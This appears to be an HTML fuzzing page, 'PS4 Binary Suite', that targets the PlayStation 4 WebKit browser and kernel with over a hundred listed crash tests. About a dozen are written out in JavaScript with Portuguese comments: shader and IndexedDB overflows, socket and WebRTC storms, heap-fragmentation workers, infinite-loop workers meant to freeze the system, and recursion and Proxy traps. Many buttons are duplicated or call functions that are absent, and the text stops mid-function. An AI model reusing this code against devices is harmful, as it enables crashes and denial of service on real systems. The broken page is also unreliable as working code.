<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Binary Suite</title>    
</head>
<body>

   

    <div class="section">
        <h2>WEBKIT (USERLAND)</h2>
        <button onclick="runShaderSmash()">TEST 1: WebGL Shader Source Overflow</button>
        <button onclick="runIDBOverflow()">TEST 2: IndexedDB Key Generator Overflow</button>
        <button onclick="runBindChain()">TEST 3: Function.bind Deep Chain Crash</button>
        <button onclick="runXMLRecursion()">TEST 1: XMLSerializer Shadow Recursion</button>
        <button onclick="runResizeLoop()">TEST 2: ResizeObserver Loop Bypass</button>
        <button onclick="runTextMetrics()">TEST 3: TextMetrics Measurement Overflow</button>
        <button onclick="runXHRRecursion()">TEST 1: XHR Synchronous Recursion</button>
        <button onclick="runReflectTrap()">TEST 2: Reflect.construct Proxy Trap</button>
        <button onclick="runArcToCrash()">TEST 3: Canvas arcTo Infinity Crash</button>
        <button onclick="runPathNaN()">TEST 1: Path2D Winding NaN Poisoning</button>
        <button onclick="runEncoderCrash()">TEST 2: TextEncoder Stream State UAF</button>
        <button onclick="runProxyRevoke()">TEST 3: Proxy Revoke During Iteration</button>
        <button onclick="runJSONEncoder()">TEST 1: JSON Encoder Malloc Failure</button>
        <button onclick="runFileLock()">TEST 2: FileSystem Write Lock Contention</button>
        <button onclick="runBYOBRace()">TEST 3: ReadableStream BYOB Detach Race</button>
        <button onclick="runSortDetach()">TEST 1: TypedArray.sort Buffer Detach</button>
        <button onclick="runExecRecursion()">TEST 2: execCommand Recursion Bomb</button>
        <button onclick="runSlotCrash()">TEST 3: HTMLSlotElement Assignment Crash</button>
        <button onclick="runTrackUAF()">TEST 1: TextTrack Cue Event UAF</button>
        <button onclick="runCustomElementRace()">TEST 2: CustomElement Upgrade Race</button>
        <button onclick="runXSLTRecursion()">TEST 3: XSLT document() Recursion</button>
        <button onclick="runUnicodeBomb()">TEST 1: String.normalize Expansion Bomb</button>
        <button onclick="runKeyframeRace()">TEST 2: CSSKeyframes Mutation Race</button>
        <button onclick="runFetchLeak()">TEST 3: Fetch AbortController Leak</button>
        <button onclick="runCSSExp()">TEST 1: CSS :nth-last-child Exponential Recalc</button>
        <button onclick="runIntlCache()">TEST 2: Intl Timezone Cache Overflow</button>
        <button onclick="runSABView()">TEST 3: SharedArrayBuffer DataView Race</button>
        <button onclick="runPortCycle()">TEST 1: MessagePort Entangled Cycle GC</button>
        <button onclick="runFormRecursion()">TEST 2: HTMLForm Recursive Submit</button>
        <button onclick="runPatternUAF()">TEST 3: CanvasPattern Video UAF</button>
        <button onclick="runMSERace()">TEST 1: MediaSource appendBuffer Detach Race</button>
        <button onclick="runWasmGrow()">TEST 2: WebAssembly Memory Grow Race</button>
        <button onclick="runMapRehash()">TEST 3: Map Rehash Heap Overflow</button>
        <button onclick="runBigIntPoison()">TEST 1: BigInt64Array Constructor Poisoning</button>
        <button onclick="runStreamDetach()">TEST 2: TransformStream Buffer Detach</button>
        <button onclick="runCSSBomb()">TEST 3: CSS Complex Selector DoS</button>
        <button onclick="runISOCrash()">TEST 1: TextDecoder ISO-2022-JP State Overflow</button>
        <button onclick="runCSSCycle()">TEST 2: CSS calc() Cyclic Dependency Lock</button>
        <button onclick="runRegexFlood()">TEST 3: RegExp Unicode Property Flood</button>
        <button onclick="runAudioRace()">TEST 1: AudioWorklet Module Load Race</button>
        <button onclick="runSVGCycle()">TEST 2: SVG Filter Cyclic Recursion</button>
        <button onclick="runSegmenterUAF()">TEST 3: Intl.Segmenter Iterator UAF</button>
        <button onclick="runHistoryRace()">TEST 1: History Back vs Iframe Destroy Race</button>
        <button onclick="runViewportLoop()">TEST 2: CSS Viewport Unit Recursion</button>
        <button onclick="runDataViewPoison()">TEST 3: DataView Getter Poisoning</button>
        <button onclick="runConsoleSprintf()">TEST 1: Console sprintf_s Buffer Overflow</button>
        <button onclick="runClassListStrcat()">TEST 2: DOMTokenList strcat Overflow</button>
        <button onclick="runPromiseDoubleResolve()">TEST 3: Promise 'Already Satisfied' Race</button>
        <button onclick="runSprintfAttack()">TEST 1: sprintf_s Precision Overflow</button>
        <button onclick="runStrcatURI()">TEST 2: URI strcat_s Buffer Too Small</button>
        <button onclick="runPromiseRace()">TEST 3: Promise 'Already Satisfied' Race</button>
        <button onclick="runSprintfAttack()">TEST 1: sprintf_s Precision Overflow</button>
        <button onclick="runOpStrcatCrash()">TEST 2: JSC op_strcat Side-Effect Crash</button>
        <button onclick="runFutureRace()">TEST 3: Future 'Already Retrieved' Race</button>
        <button onclick="runFutureLock()">TEST 1: Future 'Resource Error' Race</button>
        <button onclick="runGetsAttack()">TEST 2: gets_s Short Buffer Overflow</button>
        <button onclick="runStrcatBadDest()">TEST 3: strcat_s Bad Destination</button>
        <button onclick="runFutureLock()">TEST 1: Future 'Resource Error' Race</button>
        <button onclick="runGetsAttack()">TEST 2: gets_s Short Buffer Overflow</button>
        <button onclick="runStrcatBadDest()">TEST 3: strcat_s Bad Destination</button>
        <button onclick="runTLSStackSmash()">TEST 1: TLS 'alloca' Stack Clash</button>
        <button onclick="runProfileOverflow()">TEST 2: CodeBlock Profile Allocation Overflow</button>
        <button onclick="runSocketRace()">TEST 3: Socket 'Already Connected' Race</button>
        <button onclick="runProfileFlood()">TEST 1: CodeBlock Profile Alloc Overflow</button>
        <button onclick="runRopeFlatten()">TEST 2: JSC Rope String Flatten Crash</button>
        <button onclick="runZeroBuffer()">TEST 3: gets_s Zero Buffer Trigger</button>
        <button onclick="runBadFormat()">TEST 1: sprintf_s Bad Format Argument</button>
        <button onclick="runStrcatSmall()">TEST 2: strcat_s Buffer Too Small</button>
        <button onclick="runMomentumRace()">TEST 3: Momentum Event Logic Race</button>
        <button onclick="runBadFormat()">TEST 1: sprintf_s Bad Format Argument</button>
        <button onclick="runStrcatSmall()">TEST 2: strcat_s Buffer Too Small</button>
        <button onclick="runMomentumRace()">TEST 3: Momentum Event Logic Race</button>
        <button onclick="runAllocSlow()">TEST 1: JSC::CompleteSubspace::allocateSlow</button>
        <button onclick="runConsoleInject()">TEST 2: System Console Injection (Log page messages)</button>
        <button onclick="runAutoThread()">TEST 3: WTF::AutomaticThread Exhaustion</button>
        <button onclick="runMomentumCrash()">TEST 1: Momentum Scroll Event Logic Error</button>
        <button onclick="runFatalAlloc()">TEST 2: 'FATAL: attempt' Allocator Trigger</button>
        <button onclick="runVisibilitySuspend()">TEST 3: System Suspend Logic Stress</button>
        <button onclick="runSharedProxyRace()">TEST 1: SharedWorkerThreadProxy C++ Race</button>
        <button onclick="runSysTmpFlood()">TEST 2: /system_tmp/ Overflow Trigger</button>
        <button onclick="runAutoThreadStress()">TEST 3: WTF::AutomaticThread Starvation</button>
        <button onclick="runDinkumCrash()">TEST 1: Dinkum C++ Thread Resource Error</button>
        <button onclick="runSysmoduleRace()">TEST 2: Sysmodule Loader Race</button>
        <button onclick="runConsoleEnableRace()">TEST 3: System Console Logging Enable Race</button>
        <button onclick="runIDWrap()">TEST 1: SharedWorker ID Wraparound</button>
        <button onclick="runDevNull()">TEST 2: /dev/null IO Confusion</button>
        <button onclick="runGetsBadArg()">TEST 3: gets_s Bad Argument Trigger</button>
        <button onclick="runBOMConfusion()">TEST 1: TextDecoder BOM Confusion</button>
        <button onclick="runFontLoadRace()">TEST 2: FontFace Set Loading Race</button>
        <button onclick="runGCResurrection()">TEST 3: FinalizationRegistry </button>
        <button onclick="runFormatAttack()">TEST 1: sprintf_s Bad Format</button>
        <button onclick="runThreadStarve()">TEST 2: WTF::AutomaticThread Starvation</button>
        <button onclick="runMomentumFuzz()">TEST 3: Scroll Momentum Logic Fuzzing</button>
        <button onclick="runGridExplosion()">TEST 1: CSS Grid Memory Explosion</button>
        <button onclick="runProxyLoop()">TEST 2: SharedWorker Proxy Message Loop</button>
        <button onclick="runRegexSticky()">TEST 3: RegExp Sticky Buffer Overflow</button>
        <button onclick="runTLSStress()">TEST 1: scePthreadSetspecific Memory Error</button>
        <button onclick="runConsoleTrace()">TEST 2: Console Trace Buffer Overflow</button>
        <button onclick="runSharedProxyDestruct()">TEST 3: SharedWorkerProxy Destructor Race</button>
        <button onclick="runUnwindCrash()">TEST 1: libunwind Exception Cross-Boundary</button>
        <button onclick="runBmallocCoalesce()">TEST 2: SceNKBMalloc Coalesce Race</button>
        <button onclick="runProxyDestruct()">TEST 3: SharedWorkerProxy Destructor Race</button>
        <button onclick="runUnwindCrash()">TEST 1: libunwind Exception Cross-Boundary</button>
        <button onclick="runBmallocCoalesce()">TEST 2: SceNKBMalloc Coalesce Race</button>
        <button onclick="runProxyDestruct()">TEST 3: SharedWorkerProxy Destructor Race</button>
        <button onclick="runStaticGuard()">TEST 1: C++ Static Init Guard Deadlock</button>
        <button onclick="runSocketState()">TEST 2: Socket 'Already Connected' Race</button>
        <button onclick="runBmallocTrash()">TEST 3: SceNKBMalloc Size Class Thrashing</button>
    </div>

    <div class="section">
        <h2>KERNEL (SYSTEM)</h2>
        <button class="kernel" onclick="runPreconnectRace()">TEST 4: LinkPreconnect Socket Race</button>
        <button class="kernel" onclick="runBindCollision()">TEST 5: UDP Bind Collision Storm</button>
        <button class="kernel" onclick="runMallocSpam()">TEST 6: Parallel Malloc/Free Fragmentation</button>
        <button class="kernel" onclick="runTimerFlood()">TEST 4: High-Res Timer Syscall Flood</button>
        <button class="kernel" onclick="runMDNSFlood()">TEST 5: WebRTC mDNS Multicast Storm</button>
        <button class="kernel" onclick="runScrollClash()">TEST 6: Scroll Event Native Stack Clash</button>
        <button class="kernel" onclick="runSYNFlood()">TEST 4: Local TCP SYN Flood (Port Scan)</button>
        <button class="kernel" onclick="runReaderRace()">TEST 5: FileReader Abort/Read Race</button>
        <button class="kernel" onclick="runHistoryMem()">TEST 6: History State Memory Exhaustion</button>
        <button class="kernel" onclick="runWasmThrash()">TEST 4: WebAssembly Memory Map Thrash</button>
        <button class="kernel" onclick="runGPURace()">TEST 5: GPU Texture Upload Race</button>
        <button class="kernel" onclick="runTCPStall()">TEST 6: TCP Window Zero Stall</button>
        <button class="kernel" onclick="runIPCSize()">TEST 4: IPC Message Size Overflow</button>
        <button class="kernel" onclick="runMutexPanic()">TEST 5: Mutex Destruction Panic</button>
        <button class="kernel" onclick="runTimeThrash()">TEST 6: gettimeofday vDSO Thrash</button>
        <button class="kernel" onclick="runDMARace()">TEST 4: WebGL Video Texture DMA Race</button>
        <button class="kernel" onclick="runStatsRace()">TEST 5: WebRTC getStats Kernel UAF</button>
        <button class="kernel" onclick="runSyncTerm()">TEST 6: FileReaderSync Termination Panic</button>
        <button class="kernel" onclick="runNameCacheFlood()">TEST 4: VFS Name Cache Flood</button>
        <button class="kernel" onclick="runGPUFenceDeadlock()">TEST 5: GPU Fence Sync Deadlock</button>
        <button class="kernel" onclick="runSocketSpinlock()">TEST 6: Socket Spinlock Stress</button>
        <button class="kernel" onclick="runFragFlood()">TEST 4: WebSocket Frame Fragmentation</button>
        <button class="kernel" onclick="runSHMLeak()">TEST 5: SharedMemory Descriptor Leak</button>
        <button class="kernel" onclick="runGPUStall()">TEST 6: GPU Command Buffer Stall</button>
        <button class="kernel" onclick="runZeroUDP()">TEST 4: UDP Zero-Length Packet Flood</button>
        <button class="kernel" onclick="runStorageStorm()">TEST 5: LocalStorage Locking Storm</button>
        <button class="kernel" onclick="runZombieThreads()">TEST 6: Zombie Thread Termination Flood</button>
        <button class="kernel" onclick="runReverseDNS()">TEST 4: Reverse DNS Stack Smash</button>
        <button class="kernel" onclick="runGPUQueries()">TEST 5: GPU Query Object Exhaustion</button>
        <button class="kernel" onclick="runFDStorm()">TEST 6: File Descriptor Storm</button>
        <button class="kernel" onclick="runIPv6Smash()">TEST 4: IPv6 Address Stack Smash</button>
        <button class="kernel" onclick="runIPCSerialize()">TEST 5: IPC Circular Serialization Panic</button>
        <button class="kernel" onclick="runGPUExhaust()">TEST 6: GPU Context Handle Exhaustion</button>
        <button class="kernel" onclick="runBlobStack()">TEST 4: Blob.slice Recursive Stack Smash</button>
        <button class="kernel" onclick="runForkBomb()">TEST 5: Nested Worker Fork Bomb</button>
        <button class="kernel" onclick="runUploadStall()">TEST 6: Fetch Upload Stall</button>
        <button class="kernel" onclick="runSocketGC()">TEST 4: MessageChannel GC Storm</button>
        <button class="kernel" onclick="runHistoryDoS()">TEST 5: History Session Exhaustion</button>
        <button class="kernel" onclick="runSignalRace()">TEST 6: Worker Termination Signal Race</button>
        <button class="kernel" onclick="runWasmProtect()">TEST 4: Wasm mprotect Thrashing</button>
        <button class="kernel" onclick="runCanvasLeak()">TEST 5: Canvas Path VRAM Leak</button>
        <button class="kernel" onclick="runLingerGhost()">TEST 6: Socket Linger Ghost Close</button>
        <button class="kernel" onclick="runStackClash()">TEST 4: Worker Stack Clash</button>
        <button class="kernel" onclick="runKqueueFlood()">TEST 5: Kqueue Event Filter Exhaustion</button>
        <button class="kernel" onclick="runSynBacklog()">TEST 6: TCP SYN Backlog Flood</button>
        <button class="kernel" onclick="runHIDOverwrite()">TEST 4: HID Driver Over-Write Pos</button>
        <button class="kernel" onclick="runMlockExhaustion()">TEST 5: VM Budget mlock Exhaustion</button>
        <button class="kernel" onclick="runPthreadInternal()">TEST 6: Pthread Internal Memory Error Trigger</button>
        <button class="kernel" onclick="runHIDFlood()">TEST 4: HMD/HID Over-Write Pos</button>
        <button class="kernel" onclick="runMlockExhaust()">TEST 5: vm.budgets.mlock Exhaustion</button>
        <button class="kernel" onclick="runPthreadCrash()">TEST 6: Pthread Internal Memory Error</button>
        <button class="kernel" onclick="runHIDFlood()">TEST 4: HMD/HID Over-Write Pos</button>
        <button class="kernel" onclick="runMlockExhaust()">TEST 5: vm.budgets.mlock Exhaustion</button>
        <button class="kernel" onclick="runPthreadCrash()">TEST 6: Pthread Internal Memory Error</button>
        <button class="kernel" onclick="runCryptoLock()">TEST 4: OpenSSL Rand Mutex Deadlock</button>
        <button class="kernel" onclick="runTLSCrash()">TEST 5: scePthreadSetspecific Memory Error</button>
        <button class="kernel" onclick="runFDSlam()">TEST 6: 'Too Many Files' FD Exhaustion</button>
        <button class="kernel" onclick="runCryptoLock()">TEST 4: OpenSSL Rand Mutex Deadlock</button>
        <button class="kernel" onclick="runTLSCrash()">TEST 5: scePthreadSetspecific Memory Error</button>
        <button class="kernel" onclick="runFDSlam()">TEST 6: 'Too Many Files' FD Exhaustion</button>
        <button class="kernel" onclick="runRedZoneFail()">TEST 4: Thread Red Zone Allocation Failure</button>
        <button class="kernel" onclick="runKernelLeak()">TEST 5: Kernel Memory Leak Trigger</button>
        <button class="kernel" onclick="runAllocFail()">TEST 6: 'Could not allocate' Stress</button>
        <button class="kernel" onclick="runCryptoDeadlock()">TEST 4: OpenSSL Mutex Unlock Deadlock</button>
        <button class="kernel" onclick="runTLSBlock()">TEST 5: TLS Block Allocation Exhaustion</button>
        <button class="kernel" onclick="runStackRedZone()">TEST 6: Stack Red Zone Bypass</button>
        <button class="kernel" onclick="runTLSLeak()">TEST 4: Thread Leftover Data Leak</button>
        <button class="kernel" onclick="runHMDState()">TEST 5: HMD 'Already Connected' Race</button>
        <button class="kernel" onclick="runHugeAlloc()">TEST 6: Kernel Large Alloc Fail</button>
        <button class="kernel" onclick="runTLSLeak()">TEST 4: Thread Leftover Data Leak</button>
        <button class="kernel" onclick="runHMDState()">TEST 5: HMD 'Already Connected' Race</button>
        <button class="kernel" onclick="runHugeAlloc()">TEST 6: Kernel Large Alloc Fail</button>
        <button class="kernel" onclick="runPthreadAbort()">TEST 4: [ScePthread] abort() Trigger</button>
        <button class="kernel" onclick="runConsoleOpenFail()">TEST 5: Can't open console</button>
        <button class="kernel" onclick="runStatsRace()">TEST 6: Kernel Heap Stats Update Race</button>
        <button class="kernel" onclick="runBadFree()">TEST 4: Invalid Free Trigger</button>
        <button class="kernel" onclick="runHMDDetach()">TEST 5: HMD 'Already Detached' Race</button>
        <button class="kernel" onclick="runTLSDealloc()">TEST 6: TLS Deallocation Race</button>
        <button class="kernel" onclick="runInterruptStorm()">TEST 4: int_thread_get Interrupt Storm</button>
        <button class="kernel" onclick="runMlockUnderflow()">TEST 5: vm.budgets.mlock_avail Underflow</button>
        <button class="kernel" onclick="runInitThreadFail()">TEST 6: thr_init.c Allocation Failure</button>
        <button class="kernel" onclick="runKmemFrag()">TEST 4: kmem_map Allocation Fragmentation</button>
        <button class="kernel" onclick="runInitThreadFail()">TEST 5: Initial Thread Alloc Fail</button>
        <button class="kernel" onclick="runEROFS()">TEST 6: Read-Only Filesystem Panic</button>
        <button class="kernel" onclick="runConsolePanic()">TEST 4: Console Device Open Panic</button>
        <button class="kernel" onclick="runResourceSpray()">TEST 5: Global Resource Exhaustion</button>
        <button class="kernel" onclick="runInterruptThread()">TEST 6: Interrupt Thread Starvation </button>
        <button class="kernel" onclick="runSysctlSpam()">TEST 4: Sysctl Info Leak Stress</button>
        <button class="kernel" onclick="runSocketFullWindow()">TEST 5: Socket Buffer Full Window Deadlock</button>
        <button class="kernel" onclick="runTLSDTVCorruption()">TEST 6: TLS DTV Block Dealloc Corruption</button>
        <button class="kernel" onclick="runMlockLogic()">TEST 4: vm.budgets.mlock Underflow Attempt</button>
        <button class="kernel" onclick="runRedZoneBypass()">TEST 5: Stack Red Zone Bypass</button>
        <button class="kernel" onclick="runConsolePanic()">TEST 6: 'Can\'t open console' Panic Trigger</button>
        <button class="kernel" onclick="runInodeFlood()">TEST 4: /system_tmp/ Inode Exhaustion</button>
        <button class="kernel" onclick="runTimerStorm()">TEST 5: Timer SoftIRQ Storm</button>
        <button class="kernel" onclick="runTCPWindow()">TEST 6: TCP Window Saturation</button>
        <button class="kernel" onclick="runMlockFrag()">TEST 4: vm.budgets.mlock_total Exhaustion</button>
        <button class="kernel" onclick="runConnRace()">TEST 5: Socket 'Connection In Progress' Race</button>
        <button class="kernel" onclick="runHIDRingBuffer()">TEST 6: HID Driver Ring Buffer Overflow</button>
        <button class="kernel" onclick="runRWLockStarve()">TEST 4: RWLock Reader Starvation</button>
        <button class="kernel" onclick="runTLSLeakDeep()">TEST 5: TLS Leftover Data Leak</button>
        <button class="kernel" onclick="runTCBFail()">TEST 6: _tcb_set() Failure Stress</button>
        <button class="kernel" onclick="runRWLockStarve()">TEST 4: RWLock Reader Starvation</button>
        <button class="kernel" onclick="runTLSLeakDeep()">TEST 5: TLS Leftover Data Leak</button>
        <button class="kernel" onclick="runTCBFail()">TEST 6: _tcb_set() Failure Stress</button>
        <button class="kernel" onclick="runUMTXUnlock()">TEST 4: UMTX Unlock Error</button>
        <button class="kernel" onclick="runACPFuzz()">TEST 5: Audio Co-Processor</button>
        <button class="kernel" onclick="runSystemH()">TEST 6: /system_H Path Probe</button>
    </div>

    <div id="log"></div>
    <div id="dummy"></div>

    <script>
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }
 

        // --- TESTE 1: WebGL Shader Source Overflow ---
        function runShaderSmash() {
            log("[WebKit] Iniciando Shader Compiler Overflow...");
            
            const canvas = document.getElementById('glcanvas');
            const gl = canvas.getContext('webgl');
            
            if (!gl) return log("WebGL não suportado.");
            
            // Cria string gigante para estourar buffer de parsing
            // "attribute vec4 p;" repetido ou um comentário gigante
            const hugeComment = "/*" + "A".repeat(1024 * 1024) + "*/"; // 1MB de comentário
            const source = `
                attribute vec4 position;
                void main() {
                    gl_Position = position;
                    ${hugeComment}
                }
            `;
            
            log("Compilando Shader de 1MB...");
            
            const shader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            
            // Verifica status (se não crashou antes)
            if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
                log("Shader falhou (Seguro): " + gl.getShaderInfoLog(shader).substring(0, 100));
            } else {
                log("Shader compilado com sucesso.");
            }
        }

        // --- TESTE 2: IndexedDB Key Generator Overflow ---
        function runIDBOverflow() {
            log("[WebKit] Iniciando IDB Key Overflow...");
            
            const req = indexedDB.open("OverflowDB", Math.floor(Math.random()*10000));
            
            req.onupgradeneeded = (e) => {
                const db = e.target.result;
                // Cria store com autoIncrement
                if (!db.objectStoreNames.contains("store")) {
                    db.createObjectStore("store", { autoIncrement: true });
                }
            };
            
            req.onsuccess = (e) => {
                const db = e.target.result;
                const tx = db.transaction("store", "readwrite");
                const store = tx.objectStore("store");
                
                // Tenta inserir valor próximo do limite de inteiro seguro JS
                // para ver como o backend C++ lida com o próximo incremento
                const hugeKey = Number.MAX_SAFE_INTEGER; // 2^53 - 1
                
                log("Inserindo chave MAX_SAFE_INTEGER...");
                
                // Força chave manual
                try {
                    store.add("data", hugeKey);
                    
                    // Agora insere sem chave para forçar auto-incremento além do limite
                    store.add("data_overflow");
                    
                    tx.oncomplete = () => log("Transação completa (Seguro).");
                    tx.onerror = (e) => log("Erro IDB: " + e.target.error);
                } catch(x) {
                    log("Exceção IDB: " + x);
                }
            };
        }

        // --- TESTE 3: Function.bind Deep Chain ---
        function runBindChain() {
            log("[WebKit] Criando Bind Chain...");
            
            let func = function() { return 1; };
            
            // Cria cadeia de 50.000 binds
            // Cada bind cria um novo objeto de função embrulhado
            try {
                for(let i=0; i<50000; i++) {
                    func = func.bind(null);
                }
                
                log("Cadeia criada. Executando...");
                // A execução força a recursão interna para resolver o 'this'
                func();
                log("Bind Chain sobreviveu.");
                
            } catch(e) {
                log("Erro Bind: " + e.message);
            }
        }

        // --- TESTE 4: LinkPreconnect Socket Race (Kernel) ---
        function runPreconnectRace() {
            log("[KERNEL] Iniciando LinkPreconnect Race...");
            
            let i = 0;
            const interval = setInterval(() => {
                i++;
                if (i > 500) { clearInterval(interval); log("Teste finalizado."); return; }
                
                // Cria link
                const link = document.createElement('link');
                link.rel = 'preconnect';
                link.href = 'http://127.0.0.1:' + (Math.floor(Math.random() * 60000));
                
                document.head.appendChild(link);
                
                // Remove IMEDIATAMENTE (Race Condition)
                // O Kernel está a iniciar o handshake TCP. Remover a tag deve cancelar.
                // Se a sincronização falhar, o socket fica zumbi ou ocorre UAF.
                setTimeout(() => {
                    if (link.parentNode) link.parentNode.removeChild(link);
                }, 0);
                
            }, 10);
        }

        // --- TESTE 5: UDP Bind Collision Storm (Kernel) ---
        function runBindCollision() {
            log("[KERNEL] Iniciando UDP Bind Storm...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const pcs = [];
            
            // Cria 50 conexões tentando usar portas locais
            const interval = setInterval(() => {
                if (pcs.length > 50) { clearInterval(interval); return; }
                
                const pc = new RTCPeerConnection({iceCandidatePoolSize: 2}); // Força pré-alocação
                pc.createDataChannel("x");
                
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
                
                pcs.push(pc);
                log(`PC ${pcs.length} binding...`);
                
            }, 50);
            
            // Limpeza abrupta para estressar o unbind
            setTimeout(() => {
                log("Fechando tudo em massa...");
                pcs.forEach(p => p.close());
            }, 5000);
        }

        // --- TESTE 6: Parallel Malloc/Free Fragmentation (Kernel) ---
        function runMallocSpam() {
            log("[KERNEL] Iniciando Malloc Spam...");
            
            const workerCode = `
                onmessage = () => {
                    const allocs = [];
                    // Aloca e liberta em padrão caótico
                    setInterval(() => {
                        // Alocações pequenas (32b - 1KB) são comuns em structs do sistema
                        for(let i=0; i<100; i++) {
                            allocs.push(new ArrayBuffer(32 + Math.random() * 1000));
                        }
                        // Liberta metade aleatoriamente (fragmentação)
                        while(allocs.length > 500) {
                            const idx = Math.floor(Math.random() * allocs.length);
                            allocs.splice(idx, 1); 
                        }
                    }, 1);
                }
            `;
            
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<20; i++) {
                new Worker(url).postMessage("start");
            }
            log("20 Workers fragmentando o Heap.");
        }

function runXMLRecursion() {
            log("[WebKit] Iniciando XML Serializer Recursion...");
            const host = document.createElement('div');
            const root = host.attachShadow({mode:'open'});
            
            // Cria estrutura aninhada mista (Light DOM e Shadow DOM)
            let curr = root;
            for(let i=0; i<500; i++) {
                const el = document.createElement('div');
                curr.appendChild(el);
                curr = el;
            }
            
            // Injeta slot para projetar conteúdo
            curr.innerHTML = "<slot></slot>";
            host.innerHTML = "<span>PROJETADO</span>";
            
            try {
                log("Serializando árvore complexa...");
                const s = new XMLSerializer();
                // Tenta serializar o host, que deve resolver o Shadow DOM
                const txt = s.serializeToString(host);
                log("Serializer sobreviveu. Length: " + txt.length);
            } catch(e) {
                log("Erro XML: " + e.message);
            }
        }

        // --- TESTE 2: ResizeObserver Loop Bypass ---
        function runResizeLoop() {
            log("[WebKit] Iniciando Resize Loop...");
            
            const div1 = document.createElement('div');
            const div2 = document.createElement('div');
            document.body.appendChild(div1);
            document.body.appendChild(div2);
            
            let count = 0;
            
            const ro = new ResizeObserver(entries => {
                count++;
                if(count > 1000) { // Safety break para não travar o PC de teste, no PS4 deixamos correr
                    log("Loop detetado pelo script.");
                    return; 
                }
                
                // Observer 1 altera Div 2
                // Isso deve disparar o Observer novamente no próximo frame ou microtask
                if(entries[0].target === div1) {
                    div2.style.width = (Math.random() * 100) + "px";
                } else {
                    div1.style.width = (Math.random() * 100) + "px";
                }
            });
            
            ro.observe(div1);
            ro.observe(div2);
            
            // Trigger inicial
            div1.style.width = "10px";
            log("Loop de layout iniciado. Verifique travamento.");
            
            setTimeout(() => {
                ro.disconnect();
                document.body.removeChild(div1);
                document.body.removeChild(div2);
            }, 5000);
        }

        // --- TESTE 3: TextMetrics Measurement Overflow ---
        function runTextMetrics() {
            log("[WebKit] Iniciando TextMetrics Overflow...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                // String gigante
                const str = "W".repeat(1000000); // 1 milhão de Ws largos
                ctx.font = "100px Arial";
                
                log("Medindo string gigante...");
                // O cálculo interno pode dar overflow de float ou integer
                const metrics = ctx.measureText(str);
                
                log(`Largura calculada: ${metrics.width}`);
                
                // Tenta forçar renderização se a medida passou
                if (metrics.width > 0) {
                    ctx.fillText(str, 0, 100);
                }
                
            } catch(e) {
                log("Erro Metrics: " + e.message);
            }
        }

        // --- TESTE 4: High-Res Timer Syscall Flood (Kernel) ---
        function runTimerFlood() {
            log("[KERNEL] Iniciando Timer Syscall Flood...");
            
            const workerCode = `
                while(true) {
                    // Chama o Kernel repetidamente para obter o tempo
                    // Alta prioridade, sem pausa
                    performance.now();
                    performance.now();
                    performance.now();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança o máximo de workers possível (ex: número de cores)
            // No PS4, 6-8 workers é ideal para saturar a CPU
            for(let i=0; i<8; i++) {
                new Worker(url);
            }
            log("8 Workers em loop infinito de syscalls. Sistema deve aquecer/congelar.");
        }

        // --- TESTE 5: WebRTC mDNS Multicast Storm (Kernel) ---
        function runMDNSFlood() {
            log("[KERNEL] Iniciando mDNS Storm...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria conexão sem servidores STUN (força busca local/mDNS)
                const pc = new RTCPeerConnection();
                pc.createDataChannel("x");
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
                
                // Destroi rapidamente para cancelar e reiniciar a busca
                setTimeout(() => pc.close(), 10);
                
                count++;
                if (count % 50 === 0) log(`Ciclos mDNS: ${count}`);
                
                if (count > 500) {
                    clearInterval(interval);
                    log("Teste finalizado.");
                }
            }, 20);
        }

        // --- TESTE 6: Scroll Event Native Stack Clash (Kernel) ---
        function runScrollClash() {
            log("[KERNEL] Iniciando Scroll Stack Clash...");
            const div = document.getElementById('sandbox');
            
            let depth = 0;
            div.onscroll = () => {
                depth++;
                // Limite de segurança JS é ~10k, mas recursão nativa morre antes
                // Força novo scroll síncrono
                if (depth < 5000) {
                    div.scrollTop = depth; 
                } else {
                    log("Limite de recursão atingido.");
                }
            };
            
            try {
                log("Disparando cascata de scroll...");
                div.scrollTop = 1; // Gatilho
            } catch(e) {
                log("Erro Scroll: " + e.message);
            }
        }
// --- TESTE 1: XHR Synchronous Recursion ---
        function runXHRRecursion() {
            log("[WebKit] Iniciando XHR Recursion...");
            
            let depth = 0;
            function boom() {
                depth++;
                if (depth > 2000) return; // Limite para não travar PC, PS4 vai sofrer antes
                
                try {
                    const xhr = new XMLHttpRequest();
                    // Síncrono (false)
                    xhr.open("GET", window.location.href, false);
                    
                    // O evento roda quando o estado muda (durante o send síncrono?)
                    xhr.onreadystatechange = () => {
                        if (xhr.readyState === 4) boom(); 
                    };
                    xhr.send();
                } catch(e) {
                    // Ignora erros de rede, queremos o estouro de pilha
                }
            }
            
            setTimeout(() => {
                try { boom(); } catch(e) { log("Stack Overflow capturado: " + e); }
            }, 100);
        }

        // --- TESTE 2: Reflect.construct Proxy Trap ---
        function runReflectTrap() {
            log("[WebKit] Iniciando Reflect Trap...");
            
            function Target() { this.x = 1; }
            
            const proxy = new Proxy(Target, {
                get(t, p, r) {
                    if (p === "prototype") {
                        log("Motor pediu prototype. Invalidando...");
                        // Tenta corromper o estado durante a construção
                        return null; 
                    }
                    return Reflect.get(t, p, r);
                }
            });

            try {
                // NewTarget é o Proxy. O motor vai ler .prototype dele para criar o objeto.
                Reflect.construct(Target, [], proxy);
                log("Reflect sobreviveu.");
            } catch(e) {
                log("Erro Reflect: " + e.message);
            }
        }

        // --- TESTE 3: Canvas arcTo Infinity Crash ---
        function runArcToCrash() {
            log("[WebKit] Desenhando arcTo Infinito...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                ctx.beginPath();
                ctx.moveTo(0, 0);
                
                // Coordenadas infinitas
                // O cálculo de tangente (x1-x0, y1-y0) resulta em Infinity
                // A normalização de vetores pode falhar (divisão por zero/infinito)
